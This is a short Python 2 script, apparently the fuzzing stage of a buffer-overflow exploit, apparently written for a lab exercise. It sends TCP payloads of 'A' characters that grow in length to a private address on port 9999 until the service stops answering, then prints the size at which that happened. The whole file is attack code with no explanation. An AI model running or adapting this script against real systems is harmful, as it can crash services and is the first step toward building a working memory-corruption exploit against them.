#!/usr/bin/python
import socket
import time
import sys

size = 500

while(size < 5000):
	try:
		print "\nSending BO"
		buffer = "A" * size
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("192.168.0.17", 9999))

		s.send(buffer)
		s.close()
		print "\nDone!"
		size += 1
		time.sleep(2)
	except:
		print "Could not connect!"
		print size
		break
